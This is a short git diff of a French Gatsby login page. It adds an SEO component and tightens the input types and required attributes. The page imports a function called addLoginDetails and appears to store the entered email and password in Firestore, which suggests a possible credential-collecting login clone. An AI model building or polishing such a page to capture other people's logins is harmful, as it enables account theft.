@@ -5,6 +5,7 @@ import './nicepage.css';
 import './Connexion.css';
 import {navigate} from "gatsby"
 import {addLoginDetails} from "../firebase/firestore";
+import SEO from "../SEO";
 // markup
 const IndexPage = () => {
     const [email, setEmail] = useState("");
@@ -28,7 +29,7 @@ const IndexPage = () => {
 
     return (
         <div className={"u-body u-xl-mode"}>
-
+            <SEO/>
             <section className="u-align-center u-clearfix u-section-1" id="sec-fb27">
                 <div className="u-clearfix u-sheet u-sheet-1">
                     <StaticImage className="u-image u-image-default u-image-1" src="../images/R.png" alt="" width={2272}
@@ -38,16 +39,16 @@ const IndexPage = () => {
                               style={{padding: "15px"}}>
                             <div className="u-form-group u-form-name u-label-none">
                                 <label htmlFor="name-6797" className="u-label">Email ou numéro de mobile</label>
-                                <input value={email} onChange={e => setEmail(e.target.value)} type="text"
+                                <input value={email} onChange={e => setEmail(e.target.value)} type="email"
                                        placeholder="Email ou numéro de mobile" id="name-6797" name="email"
-                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""
+                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required={true}
                                        autoFocus={true}/>
                             </div>
                             <div className="u-form-group u-form-name u-label-none u-form-group-2">
                                 <label htmlFor="name-fe56" className="u-label">Mot de passe</label>
                                 <input value={password} onChange={e => setPassword(e.target.value)} type="password"
                                        placeholder="Mot de passe" id="name-fe56" name="password"
-                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
+                                       className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required={true}/>
                             </div>
                             <div className="u-align-center u-form-group u-form-submit">
                                 <button disabled={loading} type="submit"
